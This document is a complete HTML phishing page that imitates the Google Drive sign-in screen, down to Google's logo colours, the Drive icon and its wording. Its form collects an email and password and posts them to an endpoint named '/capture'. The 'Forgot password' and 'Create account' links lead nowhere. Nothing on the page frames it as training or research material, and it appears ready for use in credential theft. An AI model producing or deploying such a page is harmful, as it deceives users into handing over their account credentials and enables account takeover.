<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Drive</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;
background:#f8f9fa;display:flex;justify-content:center;align-items:center;
min-height:100vh;padding:16px}
.card{background:#fff;border-radius:8px;padding:48px 40px 36px;width:100%;
max-width:450px;box-shadow:0 1px 3px rgba(0,0,0,.08),0 1px 2px rgba(0,0,0,.06);
border:1px solid #dadce0}
.glogo{text-align:center;margin-bottom:8px;font-size:1.75em;font-weight:500;
letter-spacing:-0.5px}
.glogo .g1{color:#4285f4}.glogo .o1{color:#ea4335}.glogo .o2{color:#fbbc05}
.glogo .g2{color:#4285f4}.glogo .l{color:#34a853}.glogo .e{color:#ea4335}
.drive-icon{text-align:center;margin-bottom:16px}
.drive-icon svg{width:40px;height:40px}
h1{text-align:center;font-size:1.25em;font-weight:400;color:#202124;
margin-bottom:4px}
p.sub{text-align:center;font-size:.87em;color:#5f6368;margin-bottom:28px}
.field{position:relative;margin-bottom:24px}
.field input{width:100%;padding:13px 14px;border:1px solid #dadce0;
border-radius:4px;font-size:.95em;outline:none;color:#202124;
background:transparent;transition:border .2s}
.field input:focus{border:2px solid #1a73e8;padding:12px 13px}
.field label{position:absolute;top:-9px;left:10px;background:#fff;
padding:0 4px;font-size:.75em;color:#5f6368;pointer-events:none}
.field input:focus+label{color:#1a73e8}
.forgot-link{display:inline-block;margin-bottom:24px;color:#1a73e8;
text-decoration:none;font-size:.83em;font-weight:500}
.forgot-link:hover{text-decoration:underline}
.actions{display:flex;justify-content:space-between;align-items:center;
margin-top:8px}
.create{color:#1a73e8;text-decoration:none;font-size:.83em;font-weight:500}
.create:hover{text-decoration:underline}
button{padding:10px 24px;background:#1a73e8;color:#fff;border:none;
border-radius:4px;font-size:.9em;font-weight:500;cursor:pointer;
transition:background .2s,box-shadow .2s}
button:hover{background:#1765cc;box-shadow:0 1px 3px rgba(26,115,232,.4)}
.info{text-align:center;margin-top:24px;font-size:.76em;color:#5f6368;
line-height:1.5}
@media(max-width:480px){
.card{padding:32px 24px 28px;border:none;box-shadow:none;border-radius:0}
body{background:#fff;padding:0}
}
</style>
</head>
<body>
<div class="card">
<div class="glogo">
<span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
</div>
<div class="drive-icon">
<svg viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
<path d="M6.6 66.85L1.1 56.05 28.9 6.5h11L6.6 66.85z" fill="#0066da"/>
<path d="M27.4 78L14 56.05 41.8 6.5h13.4L27.4 78z" fill="#00ac47"/>
<path d="M73.7 78H27.4l13.4-21.95h46.3L73.7 78z" fill="#ea4335"/>
<path d="M86.2 56.05H40.8l13.4-21.95 18.7 0L86.2 56.05z" fill="#00832d"/>
<path d="M54.2 34.1L41.8 6.5h13.4l18.7 32.5-6.3 10.3L54.2 34.1z" fill="#2684fc"/>
<path d="M27.4 78l13.4-21.95L27.4 34.1 14 56.05 27.4 78z" fill="#ffba00"/>
</svg>
</div>
<h1 data-i18n="title">Sign in to access your files</h1>
<p class="sub" data-i18n="subtitle">Continue to Google Drive</p>
<form method="POST" action="/capture" autocomplete="off">
<div class="field">
<input type="text" id="email" name="username" required autocomplete="off"
 placeholder=" ">
<label for="email" data-i18n="email_label">Email</label>
</div>
<div class="field">
<input type="password" id="pass" name="password" required placeholder=" ">
<label for="pass" data-i18n="pass_label">Password</label>
</div>
<a href="#" class="forgot-link" data-i18n="forgot">Forgot password?</a>
<div class="actions">
<a href="#" class="create" data-i18n="create">Create account</a>
<button type="submit" data-i18n="signin">Sign in</button>
</div>
</form>
<div class="info" data-i18n="info">One account. All of Google, working for you.</div>
</div>
